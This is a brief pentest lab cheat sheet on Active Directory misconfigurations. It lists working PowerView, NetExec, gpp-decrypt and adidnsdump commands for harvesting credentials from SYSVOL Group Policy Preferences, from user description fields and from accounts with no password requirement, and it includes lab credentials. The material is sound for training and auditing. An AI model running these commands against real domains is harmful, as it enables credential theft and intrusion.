# 01.16 Miscellaneous Misconfigurations GPP SYSVOL Password in Description DNS

> Sweep SYSVOL for GPP `cpassword`, harvest description-field passwords, and crack with `gpp-decrypt`.

## Overview

Several common misconfigurations expose credentials: GPP cpassword in SYSVOL, passwords stored in AD user description fields, scripts in SYSVOL with hardcoded credentials, and PASSWD_NOTREQD accounts. adidnsdump reveals hidden DNS records. gpp-decrypt cracks GPP passwords.

## Steps

- Get-DomainUser * | select description to find passwords in description fields.
- Get-DomainUser -UACFilter PASSWD_NOTREQD to find accounts with no password requirement.
- Browse SYSVOL share for scripts containing passwords.
- CME -M gpp_password or gpp_autologin to extract GPP credentials.
- gpp-decrypt for manual cpassword decryption.
- adidnsdump -r to resolve all DNS records including hidden ones.

## Commands

### Passwords in descriptions

```powershell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

### PASSWD_NOTREQD accounts

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### Browse SYSVOL

```powershell
ls \\academy-ea-dc01\SYSVOL\<DOMAIN>.LOCAL\scripts
```

### GPP passwords CME

```bash
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

### gpp-decrypt

```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

### adidnsdump

```bash
adidnsdump -u <DOMAIN>\\forend ldap://172.16.5.5 -r
```
